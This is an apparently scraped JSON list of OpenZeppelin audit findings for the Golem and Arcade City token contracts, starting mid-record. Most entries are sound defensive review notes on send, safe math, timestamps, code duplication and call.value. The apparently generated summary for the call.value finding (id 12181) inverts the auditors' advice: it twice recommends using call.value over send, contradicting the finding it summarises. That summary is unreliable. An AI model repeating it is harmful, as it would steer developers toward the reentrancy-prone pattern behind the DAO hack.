      "protocol_name": "Golem Network Token (GNT) Audit",
      "source_link": "https://blog.openzeppelin.com/golem-network-token-gnt-audit-edfa4a45bc32/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12177",
      "title": "Remove duplicate code",
      "impact": "LOW",
      "content": "Duplicate code makes it harder to understand the code’s intention and thus, auditing the code correctly. It also increases the risk of introducing hidden bugs when modifying one of the copies of some code and not the others. We recommend the following to remove duplicate code:\n\n\n* <https://github.com/imapp-pl/golem-crowdfunding/blob/50100b27a7c6841ed430a028d100f5d45ba08fb1/contracts/Token.sol#L194-L196> are very similar to <https://github.com/imapp-pl/golem-crowdfunding/blob/50100b27a7c6841ed430a028d100f5d45ba08fb1/contracts/Token.sol#L158-L165> and could be refactored into a single `createTokens` function.\n* Lots of lines doing checks (e.g. [if the contract is in funding mode](https://github.com/imapp-pl/golem-crowdfunding/blob/50100b27a7c6841ed430a028d100f5d45ba08fb1/contracts/Token.sol#L176)) can be extracted as function modifiers to reduce function code length.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Golem Network Token (GNT) Audit",
      "source_link": "https://blog.openzeppelin.com/golem-network-token-gnt-audit-edfa4a45bc32/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12176",
      "title": "Use of send",
      "impact": "MEDIUM",
      "content": "Use of `send` is always risky and should be analyzed in detail. Two occurrences found in [line 185 of Token.sol](https://github.com/imapp-pl/golem-crowdfunding/blob/50100b27a7c6841ed430a028d100f5d45ba08fb1/contracts/Token.sol#L185) and [line 214 of Token.sol](https://github.com/imapp-pl/golem-crowdfunding/blob/50100b27a7c6841ed430a028d100f5d45ba08fb1/contracts/Token.sol#L214).  \n\n– [Always check send return value](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#c528): OK.  \n\n– [Consider calling send at the end of the function](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#3d17): Risk is low because in one case, the contract `send`s to golemFactory, which is a trusted contract, and almost at the end of the function. Consider refactoring the code to have `send` at the end, though.  \n\n– [Favor pull payments over push payments](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#fa61): No problems with push payment used, because `golemFactory` will be controlled by the Golem team. Bear in mind that if `send` at line 185 fails for any reason, the whole `finalize` call will fail.",
      "summary": "\nThis bug report is about the use of the `send` function in the Token.sol contract. `Send` should always be analyzed in detail as it is risky. Two occurrences of `send` were found in lines 185 and 214 of Token.sol. \n\nThe report suggests following the advice from a blog post on Ethereum Smart Contract Security. This includes always checking the return value of `send`, considering calling `send` at the end of the function, and favoring pull payments over push payments. \n\nIn this case, the risk is low because the `send` is to a trusted contract, and is almost at the end of the function. It is suggested to refactor the code to have `send` at the end. If `send` at line 185 fails for any reason, the whole `finalize` call will fail. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Golem Network Token (GNT) Audit",
      "source_link": "https://blog.openzeppelin.com/golem-network-token-gnt-audit-edfa4a45bc32/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12175",
      "title": "Use safe math",
      "impact": "MEDIUM",
      "content": "There are many unchecked math operations in the code. We couldn’t find any related attack vectors on the GNT contract, but it’s always better to be safe and perform checked operations. Consider [using a safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol#L6), or performing pre-condition checks on any math operation.\n\n\nThe fact that GNT supply is limited to 820,000 ether (and thus at most 820,000,000 GNT assuming all tokens are created at the best possible price) helps prevent possible overflows.",
      "summary": "\nThis bug report is about unchecked math operations in the code. This means that the code is not performing any checks to make sure that the math operations it is performing are safe and accurate. This could lead to incorrect results and even attack vectors if the code is not fixed. To fix this, it is recommended to use a safe math library or perform pre-condition checks on any math operation. The fact that GNT supply is limited to 820,000 ether helps to prevent possible overflows, but it is still important to fix the code to make sure it is secure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Golem Network Token (GNT) Audit",
      "source_link": "https://blog.openzeppelin.com/golem-network-token-gnt-audit-edfa4a45bc32/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12174",
      "title": "Timestamp usage",
      "impact": "MEDIUM",
      "content": "There’s a problem with using timestamps and `now` (alias for `block.timestamp`) for contract logic, based on the fact that miners can perform some manipulation. In general, [it’s better not to rely on timestamps for contract logic](https://github.com/ConsenSys/smart-contract-best-practices#timestamp-dependence). The solutions is to use `block.number` instead, and approximate dates with expected block heights and time periods with expected block amounts.\n\n\nThe GNTAllocation contract uses timestamps at [several](https://github.com/imapp-pl/golem-crowdfunding/blob/50100b27a7c6841ed430a028d100f5d45ba08fb1/contracts/GNTAllocation.sol#L22) [points](https://github.com/imapp-pl/golem-crowdfunding/blob/50100b27a7c6841ed430a028d100f5d45ba08fb1/contracts/GNTAllocation.sol#L56). The risk of miner manipulation, though, is really low. The potential damage is also limited: miners could only slightly manipulate the developer lock period duration. We recommend the team to consider the potential risk and switch to `block.number` if necessary.\n\n\nFor more info on this topic, see [this stack exchange question](https://ethereum.stackexchange.com/questions/413/can-a-contract-safely-rely-on-block-timestamp).\n\n\n`block.number` is correctly used in the Token.sol file.",
      "summary": "\nThis bug report concerns the use of timestamps and `now` (alias for `block.timestamp`) for contract logic in the GNTAllocation contract. It is recommended to use `block.number` instead, as miners can manipulate the timestamps. While the risk of this is low, and the potential damage limited, it is still advised to switch to `block.number` if necessary. The Token.sol file is correctly using `block.number`. For more information, there is a link to a Stack Exchange question on the topic.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Golem Network Token (GNT) Audit",
      "source_link": "https://blog.openzeppelin.com/golem-network-token-gnt-audit-edfa4a45bc32/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12188",
      "title": "Avoid name reuse",
      "impact": "LOW",
      "content": "The **sendTokens** function in TokenVesting.sol reuses the name `vestAmount`, which is also a contract public variable. Using the same name for two different things is confusing and can bring unintended behaviors.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12187",
      "title": "Tests should be independent",
      "impact": "LOW",
      "content": "Some tests depend on each other. This makes testing specific functions in isolation more difficult. We recommend [making each test independent](http://softwareengineering.stackexchange.com/a/64308) by using a new token contract for each test case, instead of using the same token instance for every test.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12186",
      "title": "Remove commented code",
      "impact": "LOW",
      "content": "Commented code just adds clutter for the reader and creates unncessary confusion. Remove [the commented `allocateBountyAndEcosystemTokens` function](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L296-L308). (edit: fixed by ArcadeCity team)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12185",
      "title": "Remove duplicate code",
      "impact": "LOW",
      "content": "Duplicate code makes it harder to understand the code’s intention and thus, auditing the code correctly. It also increases the risk of introducing hidden bugs when modifying one of the copies of some code and not the others. We recommend the following to remove duplicate code:\n\n\n* Extract **StandardToken**, **SafeMath** and **Token** code into separate files, and import them from main contract files, instead of having exact copies of each in every file. We recommend using [OpenZeppelin’s implementation of StandardToken](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/StandardToken.sol).\n* `price` and `testPrice` functions repeat the same code. `price` could do`return testPrice(block.number);`. (edit: fixed by ArcadeCity team)\n* `msg.sender` checks for authentication repeat the same patterns in many functions. Examples are [this](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L261), [this](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L318) and [this](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L339). We recommend extracting those to function modifiers.\n* `buy` function seems redundant to the fallback function for **ARCToken.sol**. (edit: fixed by ArcadeCity team)\n* [The lines calculating allocations](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L267-L268) have the same code duplicated to arrive at the allocation amount. We recommend calculating the amount first and then updating **balances** and **totalSupply**.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12184",
      "title": "Remove unnecessary code",
      "impact": "LOW",
      "content": "The `uint public presaleEtherRaised` variable seems to be unnecessary. Consider using [**multisig.balance**](http://solidity.readthedocs.io/en/develop/units-and-global-variables.html#address-related) in its place unless funds in the multisig address will be moved (and thus balance changed) before `endBlock`. Having unneeded extra variables and code increases risk and attack surface for contract’s invariants to be broken.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12183",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "There are several [magic constants](https://en.wikipedia.org/wiki/Magic_number_%28programming%29) in the contract code. Some examples are:\n\n\n* <https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L188-L199>\n* <https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L267-L276>\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12182",
      "title": "Price function is not linear",
      "impact": "MEDIUM",
      "content": "The code seems to intend a linear price function, but this is the actual behavior:\n\n\n![](https://i0.wp.com/miro.medium.com/max/2132/1*xgysx4pqSfVkwYcYLnZLfQ.png?w=840&ssl=1)\nThere is an initial period where 1 ether = 125 ARC, and then four steps of decreasing price. We recommend reviewing if the price curve meets the desired shape.",
      "summary": "\nThis bug report is about a code that is intended to produce a linear price function, but instead produces a price curve with four steps of decreasing price. The initial period of the curve has 1 ether equal to 125 ARC. It is recommended that the code be reviewed to ensure that the price curve meets the desired shape.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12181",
      "title": "Remove unneeded call.value()",
      "impact": "MEDIUM",
      "content": "Using `call.value()` [is potentially dangerous, and was responsible for the TheDAO hack](https://ethereum.stackexchange.com/questions/6391/what-does-call-value-mean-and-how-did-it-allow-the-attack-to-the-dao). We couldn’t find a reason to use `multisig.call.value(msg.value)` instead of the simpler`multisig.send(msg.value)`. We recommend making this change. (edit: fixed by ArcadeCity team)",
      "summary": "\nThis bug report discusses the potential danger of using `call.value()` and how it was responsible for the TheDAO hack. It is recommended to use `multisig.call.value(msg.value)` instead of `multisig.send(msg.value)` for safety. The ArcadeCity team has already fixed this issue. \n\nTheDAO hack occurred in June 2016 and was caused by a vulnerability in the code of the DAO smart contract. This vulnerability allowed an attacker to gain access to the funds of the DAO and drain them from the system. The exploit used was called the recursive call attack, which was enabled by the use of the `call.value()` function. \n\n`Call.value()` is a function that allows a contract to send Ether to another contract, while also transferring the msg.value (the amount of Ether sent with the transaction) to the called contract. This function is potentially dangerous as it can be used to create recursive calls, which can be used to gain access to the funds of the contract.\n\nThe bug report recommends using the `multisig.call.value(msg.value)` instead of the simpler `multisig.send(msg.value)` to avoid potential danger. The ArcadeCity team has already fixed this issue. \n\nIn conclusion, the bug report discusses the potential danger of using `call.value()` and how it was responsible for the TheDAO hack. It is recommended to use `multisig.call.value(msg.value)` instead of `multisig.send(msg.value)` for safety, and the ArcadeCity team has already fixed this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12180",
      "title": "Use latest version of Solidity",
      "impact": "MEDIUM",
      "content": "Current code is written for old versions of solc. While this is not a security problem, it’s recommended to use latest version of Solidity for any new contract. Using old versions of Solidity also has some consequences that bring potential security problems. For example, all functions can have `msg.value &gt; 0`, which can cause the balance of the contract to be non-zero (which doesn’t seem to be desired, based on the `multisig` forwarding account).\n\n\nWe recommend:\n\n\n* Adding `pragma solidity ^0.4.2;` to the top of each contract file. (edit: fixed by ArcadeCity team)\n* Adding `payable` function modifier to the fallback function andthe `buyRecipient` function. These are the only functions that need to be able to handle incoming payments.",
      "summary": "\nThis bug report is about the current code written for old versions of solc. This code may lead to potential security problems and is not recommended for any new contracts. To address this issue, it is necessary to add the pragma solidity ^0.4.2; to the top of each contract file and the payable function modifier to the fallback function and the buyRecipient function. This will enable them to handle incoming payments. The ArcadeCity team have already fixed this issue. It is important to use the latest version of Solidity to avoid any security risks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12179",
      "title": "General code quality",
      "impact": "MEDIUM",
      "content": "Code quality of the ac-token project is low, which made auditing it hard. We recommend a refactor to improve code quality (more recommendations given next), and maybe doing a second security audit. Simpler code makes functionality more apparent and reduces attack surface. Given the high degree of test coverage, making changes to improve code quality will have a very low risk of introducing regressions.",
      "summary": "\nThe ac-token project has been found to have low code quality, making it difficult to audit. To improve the code quality, a refactor is recommended. This will make the functionality easier to understand and reduce the attack surface. As the test coverage of the project is already high, there is a low risk of introducing regressions when making changes. Additionally, it is suggested to do a second security audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) token audit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}